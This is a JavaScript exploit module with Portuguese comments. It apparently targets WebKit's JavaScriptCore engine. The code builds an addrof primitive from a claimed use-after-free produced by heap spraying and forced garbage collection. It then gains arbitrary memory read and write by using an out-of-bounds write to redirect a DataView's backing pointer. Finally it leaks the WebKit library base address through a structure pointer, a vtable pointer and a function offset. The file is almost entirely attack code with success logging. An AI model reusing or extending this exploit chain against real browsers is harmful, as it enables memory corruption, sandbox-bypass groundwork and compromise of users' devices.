// js/script3/testArrayBufferVictimCrash.mjs (v82 - R57.1 - Fusão UAF+OOB Estável)
// =======================================================================================
// ESTA VERSÃO CORRIGE A FALHA DA R57.
// O problema era que a primitiva 'addrof' retornava NaN para objetos simples.
// A correção é usar um objeto mais complexo (uma função) na fase de demonstração
// para garantir que um ponteiro válido seja vazado, permitindo a conclusão do exploit.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    getOOBDataView
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R57_1_StableFusion";

// --- Funções de Conversão ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8); const u32 = new Uint32Array(buf); const f64 = new Float64Array(buf);
    u32[0] = int64.low(); u32[1] = int64.high(); return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8); (new Float64Array(buf))[0] = double; const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (R57.1 - Fusão Estável)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Fusão Estável UAF+OOB (R57.1) ---`, "test");
    
    let final_result = { success: false, message: "A cadeia de fusão não obteve sucesso." };
    let dangling_ref = null;

    try {
        // --- FASE 1: Obtenção da primitiva `addrof` via UAF ---
        logS3("--- FASE 1: Obtendo 'addrof' via UAF... ---", "subtest");
        
        await triggerGC_Hyper();
        dangling_ref = sprayAndCreateDanglingPointer();
        await triggerGC_Hyper(); await PAUSE_S3(100); await triggerGC_Hyper();

        const spray_buffers = [];
        for (let i = 0; i < 1024; i++) {
            spray_buffers.push(new ArrayBuffer(136));
        }
        
        if (typeof dangling_ref.corrupted_prop !== 'number') {
            throw new Error(`Falha no UAF. Tipo da propriedade era '${typeof dangling_ref.corrupted_prop}', esperado 'number'.`);
        }
        
        // Encapsulando a lógica do addrof em uma função reutilizável
        const get_addr_of = (obj) => {
            dangling_ref.corrupted_prop = obj; // Colocamos o objeto alvo na propriedade
            return doubleToInt64(dangling_ref.corrupted_prop);
        };
        logS3(`++++++++++++ SUCESSO! Primitiva 'addrof' estável obtida! ++++++++++++`, "vuln");

        // --- FASE 2: Armando Primitivas de R/W via OOB ---
        logS3("--- FASE 2: Armamento das primitivas de R/W via OOB... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true }); 
        const oob_dv = getOOBDataView();
        if (!oob_dv) {
            throw new Error("Não foi possível obter a referência para o oob_dataview_real.");
        }

        const OOB_DV_METADATA_BASE = 0x58;
        const OOB_DV_M_VECTOR_OFFSET = OOB_DV_METADATA_BASE + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; // 0x58 + 0x10 = 0x68

        const arb_read = (address) => {
            if (!isAdvancedInt64Object(address)) address = new AdvancedInt64(address);
            oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, address, 8);
            const low = oob_dv.getUint32(0, true);
            const high = oob_dv.getUint32(4, true);
            return new AdvancedInt64(low, high);
        };

        const arb_write = (address, value) => {
            if (!isAdvancedInt64Object(address)) address = new AdvancedInt64(address);
            if (!isAdvancedInt64Object(value)) value = new AdvancedInt64(value);
            oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, address, 8);
            oob_dv.setUint32(0, value.low(), true);
            oob_dv.setUint32(4, value.high(), true);
        };
        logS3("Funções 'arb_read' e 'arb_write' baseadas em OOB criadas com sucesso!", "vuln");

        // --- FASE 3: Demonstração da Fusão - Vazando a base do WebKit ---
        logS3("--- FASE 3: Demonstração - Usando 'addrof' e 'arb_read' juntos... ---", "subtest");
        
        // CORREÇÃO: Usamos uma função como objeto de demonstração. Funções são objetos
        // complexos e não são otimizados para NaN, garantindo que 'addrof' retorne um ponteiro válido.
        const demo_obj = function() { return 1; };
        
        const demo_obj_addr = get_addr_of(demo_obj);
        logS3(`Endereço do 'demo_obj' (via addrof UAF): ${demo_obj_addr.toString(true)}`, "info");
        
        // Verificamos se o ponteiro é válido antes de prosseguir
        if (demo_obj_addr.high() === 0x7ff80000 && demo_obj_addr.low() === 0) {
            throw new Error("addrof retornou um ponteiro NaN, a demonstração falhou.");
        }
        
        const structure_ptr = arb_read(demo_obj_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET));
        logS3(`Endereço da Estrutura (via arb_read OOB): ${structure_ptr.toString(true)}`, "info");
        
        const vtable_ptr = arb_read(structure_ptr);
        logS3(`Endereço da VTable: ${vtable_ptr.toString(true)}`, "info");
        
        const webkit_base = vtable_ptr.sub(new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"]));
        logS3(`++++++++++++ SUCESSO! Base do WebKit vazada! ++++++++++++`, "vuln");
        logS3(`Endereço Base do WebKit: ${webkit_base.toString(true)}`, "leak");
        
        final_result = { 
            success: true, 
            message: "Cadeia de Exploit Híbrida UAF+OOB concluída com sucesso!",
            webkit_base_addr: webkit_base.toString(true),
        };

    } catch (e) {
        final_result.message = `Exceção na cadeia de fusão: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: final_result,
        webkit_leak_result: final_result,
        heisenbug_on_M2_in_best_result: final_result.success
    };
}


// --- Funções Auxiliares (sem alterações da R56) ---

async function triggerGC_Hyper() {
    try {
        const arr = [];
        for (let i = 0; i < 500; i++) arr.push(new ArrayBuffer(1024 * 128));
    } catch (e) { /* Silencioso */ }
    await PAUSE_S3(100);
}

function sprayAndCreateDanglingPointer() {
    let dangling_ref_internal = null;
    function createScope() {
        const victim = {
            prop_a: 0.1, prop_b: 0.2, prop_c: 0.3, prop_d: 0.4,
            prop_e: 0.5, prop_f: 0.6, prop_g: 0.7, prop_h: 0.8,
            corrupted_prop: 0.12345, // Propriedade chave para o addrof
        };
        dangling_ref_internal = victim;
        for(let i=0; i<100; i++) { dangling_ref_internal.prop_a += 1; }
    }
    createScope();
    return dangling_ref_internal;
}
